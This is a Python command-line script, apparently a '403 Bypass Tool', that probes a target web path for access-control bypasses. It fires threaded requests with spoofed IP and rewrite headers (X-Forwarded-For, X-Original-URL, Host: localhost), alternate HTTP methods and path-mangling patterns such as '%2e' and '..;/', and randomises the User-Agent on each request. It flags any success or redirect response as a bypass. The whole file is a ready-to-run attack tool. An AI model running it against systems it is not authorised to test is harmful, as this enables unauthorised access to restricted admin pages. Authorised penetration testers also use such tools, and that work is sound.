#!/usr/bin/env python3
import requests
import sys
import argparse
import random
import string
from concurrent.futures import ThreadPoolExecutor

class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    END = '\033[0m'
    BOLD = '\033[1m'

def random_user_agent():
    return ''.join(random.choices(string.ascii_uppercase, k=7))

BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"X-Original-URL": "admin"},
    {"X-Rewrite-URL": "admin"},
    {"Client-IP": "127.0.0.1"},
    {"Host": "localhost"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Host": "127.0.0.1"}
]

HTTP_METHODS = ["GET", "POST", "PUT", "HEAD", "PATCH", "TRACE"]

PATH_TECHNIQUES = [
    "/{}", "/%2e/{}", "/{}/.", "//{}//", "/./{}/./",
    "/{}?", "/{}.html", "/{}#", "/{}..;/", "/{};/",
    "///{}///", "/ADMIN/", "/*/{}", "//{}", "/{}../" #nginx missconfig test
]

def test_bypass(url, path, headers=None, method="GET", verbose=False):
    try:
        full_url = url + path
        
        # Adiciona User-Agent aleatório a todas as requisições
        final_headers = headers.copy() if headers else {}
        final_headers["User-Agent"] = random_user_agent()
        
        if verbose:
            print(f"{colors.BLUE}[*] Testing: {method} {full_url}", end='')
            if headers:
                print(f" with headers: {headers}", end='')
            print(colors.END)
        
        response = requests.request(
            method, 
            full_url, 
            headers=final_headers, 
            timeout=5,
            allow_redirects=True
        )
        
        if verbose:
            print(f"{colors.YELLOW}    Response: {response.status_code}{colors.END}")
        
        if response.status_code in [200, 301, 302, 303, 307, 308]:
            return response.status_code, method, final_headers, path
        
    except Exception as e:
        if verbose:
            print(f"{colors.RED}    Error: {e}{colors.END}")
    return None, None, None, None

def run_tests(target_url, path, threads=20, verbose=False):
    if verbose:
        print(f"\n{colors.BOLD}[*] Starting tests on {target_url}/{path}{colors.END}")
    
    # Test HTTP methods
    if verbose:
        print(f"\n{colors.BOLD}[*] Testing HTTP Methods{colors.END}")
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for method in HTTP_METHODS:
            executor.submit(
                lambda m=method: process_result(
                    test_bypass(target_url, f"/{path}", None, m, verbose),
                    target_url
                )
            )

    # Test headers
    if verbose:
        print(f"\n{colors.BOLD}[*] Testing Headers{colors.END}")
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for header in BYPASS_HEADERS:
            executor.submit(
                lambda h=header.copy(): process_result(
                    test_bypass(target_url, f"/{path}", h, "GET", verbose),
                    target_url
                )
            )

    # Test path fuzzing
    if path and verbose:
        print(f"\n{colors.BOLD}[*] Testing Path Fuzzing{colors.END}")
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for technique in PATH_TECHNIQUES:
            modified_path = technique.format(path)
            executor.submit(
                lambda mp=modified_path: process_result(
                    test_bypass(target_url, mp, None, "GET", verbose),
                    target_url
                )
            )

def process_result(result, target_url):
    status_code, method, headers, path = result
    if status_code and status_code >= 200 and status_code < 400:
        print(f"\n{colors.GREEN}[+] Bypass found!{colors.END}")
        print(f"URL: {target_url}{path}")
        print(f"Method: {colors.BOLD}{method}{colors.END}")
        print(f"Status: {colors.BOLD}{status_code}{colors.END}")
        if headers:
            print("Headers:")
            for k, v in headers.items():
                if k != "User-Agent":  
                    print(f"  {k}: {v}")
        print("-" * 50)

def main():
    parser = argparse.ArgumentParser(description='403 Bypass Tool')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('path', nargs='?', help='Path to test')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-t', '--threads', type=int, default=20, help='Number of threads')
    
    args = parser.parse_args()
    
    if not args.url.startswith(('http://', 'https://')):
        args.url = f'https://{args.url}'
    
    run_tests(
        target_url=args.url.rstrip('/'),
        path=args.path if args.path else '',
        threads=args.threads,
        verbose=args.verbose
    )

if __name__ == "__main__":
    main()
